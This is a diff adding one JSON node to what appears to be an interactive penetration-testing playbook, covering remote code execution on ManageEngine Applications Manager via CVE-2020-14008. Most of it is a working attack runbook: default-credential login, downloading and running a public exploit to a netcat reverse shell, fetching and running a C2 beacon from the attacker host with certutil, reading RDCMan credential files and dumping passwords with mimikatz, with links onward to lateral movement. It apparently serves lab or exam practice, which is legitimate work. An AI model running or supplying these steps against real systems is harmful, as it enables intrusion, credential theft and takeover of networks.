@@ -1,0 +1,30 @@
+{
+  "id": "manageengine_appmanager",
+  "phase": "EXPLOIT",
+  "title": "ManageEngine AppManager — CVE-2020-14008 RCE",
+  "body": "ManageEngine Applications Manager runs on non-standard ports (8443 HTTPS / 44444 HTTP). The login page reveals the version — look for AppManager 14.x (build ≤ 14530) which is vulnerable to CVE-2020-14008, an unauthenticated/authenticated RCE via a malicious JAR file upload through the WebLogic credential test endpoint.\n\nDefault credentials are admin/admin — try these before anything else. The nmap AppManager fingerprint and the JSESSIONID_APM_44444 cookie in responses are the giveaway.\n\nThe shell lands as NT AUTHORITY\\SYSTEM immediately — no privesc needed on the initial box.\n\nNote: The exploit creates a JAR, uploads it, uses a scheduled task to move it to the WebLogic classpath, then triggers RCE via the credentialtest endpoint. The exploit handles all of this automatically — just provide your listener details.\n\nIf exploit 48793 fails on direct upload, it automatically falls back to the task-based move method. Wait for it — it takes 30-60 seconds.",
+  "cmd": "# ══════════════════════════════════════════════════\n# IDENTIFY — AppManager on non-standard ports\n# ══════════════════════════════════════════════════\nnmap -sV -p 8443,44444 <target>\n# Look for: AppManager, JSESSIONID_APM_44444, Applications Manager in title\n# feroxbuster will hit /backup /bin /mobile on the root\n\n# ══════════════════════════════════════════════════\n# DEFAULT CREDS — always try first\n# ══════════════════════════════════════════════════\n# Browse to http://<target>:44444 or https://<target>:8443\n# Username: admin\n# Password: admin\n# Version shown in bottom-left of dashboard\n\n# ══════════════════════════════════════════════════\n# EXPLOIT — CVE-2020-14008 (AppManager 14.x ≤ 14530)\n# ══════════════════════════════════════════════════\n# Download:\nwget https://www.exploit-db.com/download/48793 -O 48793.py\npip3 install requests urllib3 --break-system-packages\n# OR use venv:\npython3 -m venv venv && source venv/bin/activate && pip install requests urllib3\n\n# Set up listener first:\nnc -nlvp <port>\n\n# Run exploit:\npython3 48793.py http://<target>:44444 admin admin <kali-ip> <port>\n# https variant:\npython3 48793.py https://<target>:8443 admin admin <kali-ip> <port>\n\n# ══════════════════════════════════════════════════\n# WHAT HAPPENS\n# ══════════════════════════════════════════════════\n# [*] Visiting page to retrieve initial cookies...\n# [*] Retrieving admin cookie...\n# [*] Getting base directory of ManageEngine...\n# [*] Found base directory: C:\\Program Files\\ManageEngine\\AppManager14\n# [*] Creating JAR file...\n# [*] Uploading JAR file...\n# [!] Failed to upload JAR directly, continue to add and execute job to move JAR...\n# [*] Creating a task to move the JAR...\n# [*] Executing task... (this takes 30-60 seconds)\n# [*] Running the Weblogic credentialtest which triggers code in JAR...\n# [*] Check your shell...\n# Shell lands as: NT AUTHORITY\\SYSTEM\n\n# ══════════════════════════════════════════════════\n# POST-SHELL — immediate actions\n# ══════════════════════════════════════════════════\n# Upgrade to stable shell (C2 beacon recommended):\ncertutil -urlcache -split -f http://<kali-ip>:<port>/beacon.exe C:\\Tmp\\beacon.exe\nC:\\Tmp\\beacon.exe\n\n# Find RDCMan settings (pivot creds):\ndir /s /b C:\\*.settings 2>nul\n# Usually: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\ntype \"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\"\n\n# Also check for the older .rdg format:\ndir /s /b C:\\*.rdg 2>nul\n\n# Pull credentials from Credential Manager (run mimikatz):\n# privilege::debug\n# sekurlsa::logonpasswords\n# Look for credman blocks with cleartext passwords",
+  "warn": "The exploit requires Java (jar command) to be available on Kali to build the malicious JAR. If 'jar' is not found, install default-jdk: sudo apt install default-jdk. The exploit also requires requests and urllib3 — Kali's externally-managed pip will block system install; use --break-system-packages or a venv. The 'Failed to upload JAR directly' message is NORMAL — the exploit continues via the scheduled task fallback automatically. Do not kill it.",
+  "choices": [
+    {
+      "label": "Got shell — find pivot creds (RDCMan / mimikatz)",
+      "next": "post_exploit_windows"
+    },
+    {
+      "label": "Got creds from RDCMan settings — lateral move",
+      "next": "creds_found"
+    },
+    {
+      "label": "Upload C2 beacon and stabilize",
+      "next": "c2_sliver"
+    },
+    {
+      "label": "Run mimikatz on the box",
+      "next": "mimikatz"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
